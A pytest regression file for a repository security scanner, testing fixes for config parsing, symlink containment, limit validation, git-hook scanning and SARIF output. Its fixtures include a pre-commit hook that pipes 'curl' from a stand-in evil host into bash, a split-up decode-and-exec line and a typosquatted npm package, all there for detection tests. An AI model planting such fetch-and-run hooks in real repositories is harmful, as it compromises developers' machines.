"""Regressions for medium findings from the adversarial security review."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config, ConfigResolver
from cordon_scanner.core.content import FileContent
from cordon_scanner.core.errors import ConfigError, CordonError
from cordon_scanner.core.limits import Limits
from cordon_scanner.core.walker import Walker
from support import assemble


def config(**kw) -> Config:
    return Config.default().with_overrides(use_cache=False, **kw)


def rule_ids(root, cfg=None) -> set[str]:
    return {f.rule_id for f in Scanner(cfg or config()).scan(root).findings}


class TestM03YamlParser:
    def test_a_url_in_a_list_is_not_a_mapping(self) -> None:
        """Every URL is a sequence item containing a colon, and the test for an
        inline mapping was `":" in item`. Every `references:` entry in every
        shipped rule was turned into a single-key dict and stringified."""
        from cordon_scanner.rules.loader import RuleLoader

        for pack in RuleLoader.load_builtin():
            for compiled in pack.rules:
                for ref in compiled.rule.references:
                    assert ref.startswith("http"), ref
                    assert "{" not in ref, ref

    def test_a_duplicate_key_is_refused(self, tmp_path) -> None:
        """Last-win silently let a hostile config put the benign value where a
        reviewer reads it and the real one fifty lines down."""
        path = tmp_path / "cordon.yaml"
        path.write_text('scan:\n  exclude: []\n  exclude: ["**/*"]\n', encoding="utf-8")
        with pytest.raises(ConfigError, match="duplicate key"):
            Config.from_file(path)

    def test_an_oversized_config_is_refused(self, tmp_path) -> None:
        path = tmp_path / "cordon.yaml"
        path.write_text(
            "# " + "x" * (2 * 1024 * 1024) + "\nscan:\n  offline: true\n", encoding="utf-8"
        )
        with pytest.raises(ConfigError, match="limit"):
            Config.from_file(path)

    def test_an_ordinary_inline_mapping_still_parses(self, tmp_path) -> None:
        path = tmp_path / "cordon.yaml"
        path.write_text(
            "policy:\n  fail_on:\n    - high\n    - category: malicious\n", encoding="utf-8"
        )
        assert Config.from_file(path).policy.fail_on_categories


class TestM02Containment:
    @pytest.mark.skipif(not hasattr(__import__("os"), "symlink"), reason="symlinks unavailable")
    def test_a_sibling_directory_prefix_is_not_inside(self, tmp_path) -> None:
        """`/home/u/repo` is a prefix of `/home/u/repo-evil`, so a string-prefix
        check let a config symlinked to `../repo-evil/` pass a guard written to
        stop exactly that."""
        outside = tmp_path / "repo-evil"
        outside.mkdir()
        (outside / "cordon.yaml").write_text(
            "scan:\n  severity_threshold: critical\n", encoding="utf-8"
        )

        root = tmp_path / "repo"
        root.mkdir()
        (root / "cordon.yaml").symlink_to(outside / "cordon.yaml")

        with pytest.raises(ConfigError, match="outside the scan root"):
            ConfigResolver.resolve(root=root)


class TestM04LimitValidation:
    @pytest.mark.parametrize(
        "bad",
        [
            {"max_file_bytes": "big"},
            {"max_archive_depth": -1},
            {"total_timeout": -5},
            {"max_workers": 99999},
            {"max_files": 0},
            {"max_path_depth": 0},
        ],
    )
    def test_out_of_range_and_wrong_type_are_refused(self, bad) -> None:
        """Only keys were checked, so `max_file_bytes: "big"` parsed and failed
        far away inside a comparison, surfacing as exit 2, "this is a bug in
        cordon", for a typo in the user's own file."""
        with pytest.raises(ValueError):
            Limits.from_dict(bad)

    def test_merged_is_validated_too(self) -> None:
        """It was a bare `dataclasses.replace`, and it is the route every
        command-line override takes."""
        with pytest.raises(ValueError):
            Limits().merged(max_archive_depth=-1)

    def test_valid_values_still_work(self) -> None:
        assert Limits.from_dict({"max_files": 500}).max_files == 500
        assert Limits().merged(total_timeout=30).total_timeout == 30


class TestM14Extension:
    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            ("README", ""),
            ("Makefile", ""),
            ("src/Makefile", ""),
            ("Dockerfile", ""),
            (".gitignore", ""),
            ("a.py", ".py"),
            ("dir.d/file", ""),
            ("a.tar.gz", ".gz"),
        ],
    )
    def test_no_extension_is_fabricated(self, path: str, expected: str) -> None:
        """`"README".rpartition(".")` returns `('', '', 'README')`, so the
        property invented `.readme` at the repository root while the same file
        one directory down returned empty."""
        assert FileContent.from_bytes(path, b"x").extension == expected


class TestM12DeadConfiguration:
    def test_scan_minified_is_honoured(self, tmp_path) -> None:
        """The setting was parsed, validated, provenance-tracked, included in
        the config fingerprint and read nowhere."""
        # A deterministic high-entropy line. Built by hashing rather than with
        # `random`, so the fixture is identical on every run and no
        # pseudo-random generator is involved. Base64 rather than hex, because
        # hex is low entropy over its own alphabet -- which is exactly the
        # distinction this rule is built on.
        import base64
        import hashlib

        blob = "".join(
            base64.b64encode(hashlib.sha256(str(i).encode()).digest()).decode() for i in range(80)
        )[:3000]
        (tmp_path / "dist").mkdir()
        (tmp_path / "dist" / "bundle.js").write_text(blob + "\n", encoding="utf-8")

        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in rule_ids(tmp_path)
        quiet = config(minified=("dist/**",))
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in rule_ids(tmp_path, quiet)

    def test_an_extensionless_script_is_identified_by_shebang(self, tmp_path) -> None:
        """`install`, `preinstall` and `configure` got `language=None` and
        therefore only the language-agnostic rules, although the shebang says
        what they are. Extensionless install scripts are a normal shipping form
        and a normal place for a payload."""
        body = (
            "#!/usr/bin/env python3\n"
            "import base64\n" + assemble("ex", "ec(base64.b64", 'decode("cHJpbnQoMSk="))\n')
            # Assembled, not written whole: this project scans its own
            # repository and a complete decode-and-execute literal here is a
            # true positive. The tool should not need an exception for itself.
        )
        (tmp_path / "install").write_text(body, encoding="utf-8")
        (tmp_path / "install.py").write_text(body, encoding="utf-8")

        found = {
            f.location.path
            for f in Scanner(config()).scan(tmp_path).findings
            if f.rule_id == "SUSPECT.DECODE_EXEC.001"
        }
        assert found == {"install", "install.py"}


class TestM07GitHooks:
    """`.git` is pruned, which is right for the object store and wrong for
    `.git/hooks`. A malicious `.git/hooks/pre-commit` is a classic persistence
    mechanism, survives `git clean`, and the engine already had a branch
    labelling those paths as install hooks -- a branch the walker made
    unreachable."""

    @pytest.fixture
    def repo(self, tmp_path):
        (tmp_path / ".git" / "hooks").mkdir(parents=True)
        (tmp_path / ".git" / "objects" / "ab").mkdir(parents=True)
        (tmp_path / ".git" / "objects" / "ab" / "deadbeef").write_bytes(b"\x00binary")
        (tmp_path / ".git" / "config").write_text("[core]\n", encoding="utf-8")
        (tmp_path / "a.js").write_text("const x = 1;\n", encoding="utf-8")
        return tmp_path

    def test_a_malicious_hook_is_found(self, repo) -> None:
        (repo / ".git" / "hooks" / "pre-commit").write_text(
            "#!/bin/sh\ncurl -sSL https://evil.invalid/x | bash\n", encoding="utf-8"
        )
        found = {
            f.location.path
            for f in Scanner(config()).scan(repo).findings
            if f.category.value in {"malicious", "suspicious"}
        }
        assert ".git/hooks/pre-commit" in found

    def test_the_object_store_is_still_pruned(self, repo) -> None:
        """Entering `.git` to reach `hooks` must not walk everything else in
        it, which is what pruning `.git` is for."""
        walked = {entry.rel_path for entry in Walker().walk(repo)}
        assert not [p for p in walked if p.startswith(".git/objects")]

    def test_loose_files_beside_the_hooks_are_not_walked(self, repo) -> None:
        walked = {entry.rel_path for entry in Walker().walk(repo)}
        assert ".git/config" not in walked

    def test_ordinary_files_are_unaffected(self, repo) -> None:
        walked = {entry.rel_path for entry in Walker().walk(repo)}
        assert "a.js" in walked


class TestM09SarifLocations:
    def test_no_dependency_finding_has_an_empty_uri(self, tmp_path) -> None:
        """GitHub code scanning cannot anchor an alert to an empty URI, so the
        entire dependency layer was invisible in the integration that is the
        product's main CI story."""
        (tmp_path / "package.json").write_text('{"name":"app","version":"1.0.0"}', encoding="utf-8")
        (tmp_path / "package-lock.json").write_text(
            '{"lockfileVersion":3,"packages":{"":{"name":"app"},'
            '"node_modules/expresss":{"version":"4.18.2",'
            '"resolved":"https://registry.npmjs.org/expresss/-/expresss-4.18.2.tgz"}}}',
            encoding="utf-8",
        )
        result = Scanner(config()).scan(tmp_path)
        dependency_findings = [f for f in result.findings if f.evidence.kind.value == "graph"]
        assert dependency_findings
        for finding in dependency_findings:
            assert finding.location.path


class TestM11EngineRequirement:
    PACK = """pack:
  id: t
  version: 1.0.0
  license: Apache-2.0
  requires_engine: "{req}"
rules:
  - id: T.001
    title: t
    category: suspicious
    severity: low
    confidence: low
    message: x
    remediation: x
    match:
      kind: regex
      patterns:
        - "abcdef"
    tests:
      positive:
        - "abcdef"
      negative:
        - "zzzzzz"
"""

    def load(self, tmp_path, requirement: str):
        from cordon_scanner.rules.loader import RuleLoader

        path = tmp_path / "p.yaml"
        path.write_text(self.PACK.format(req=requirement), encoding="utf-8")
        return RuleLoader().load_file(path)

    @pytest.mark.parametrize("requirement", [">=0.1", "==0.1", ">=0.1,<2.0"])
    def test_a_satisfied_requirement_loads(self, tmp_path, requirement: str) -> None:
        assert self.load(tmp_path, requirement).rules

    @pytest.mark.parametrize("requirement", [">=99.0", "<0.1", ">=0.1,<0.1"])
    def test_an_unsatisfied_requirement_is_refused(self, tmp_path, requirement: str) -> None:
        """version.py promises the loader "refuses a pack whose requirement this
        engine does not satisfy rather than loading it and silently skipping the
        rules it cannot compile". The key was accepted and discarded."""
        with pytest.raises(CordonError):
            self.load(tmp_path, requirement)

    def test_an_unparseable_requirement_is_refused(self, tmp_path) -> None:
        """Refused rather than guessed at: a misread requirement silently runs a
        pack that was not meant for this engine."""
        with pytest.raises(CordonError):
            self.load(tmp_path, "~=1.0")


class TestM19PathDisclosure:
    def test_findings_about_the_scan_are_not_absolute(self, tmp_path) -> None:
        """In CI an absolute root exposes runner directory layouts, internal
        project names and sometimes usernames, into artefacts routinely uploaded
        to third parties."""
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "cordon.yaml").write_text('scan:\n  exclude:\n    - "**/*"\n', encoding="utf-8")
        cfg = ConfigResolver.resolve(root=tmp_path).with_overrides(use_cache=False)
        for finding in Scanner(cfg).scan(tmp_path).findings:
            assert not finding.location.path.startswith("/")

    def test_the_repository_root_serialises_as_a_name(self, tmp_path) -> None:
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        result = Scanner(config()).scan(tmp_path)
        assert result.repository is not None
        assert "/" not in result.repository.to_dict()["root"]
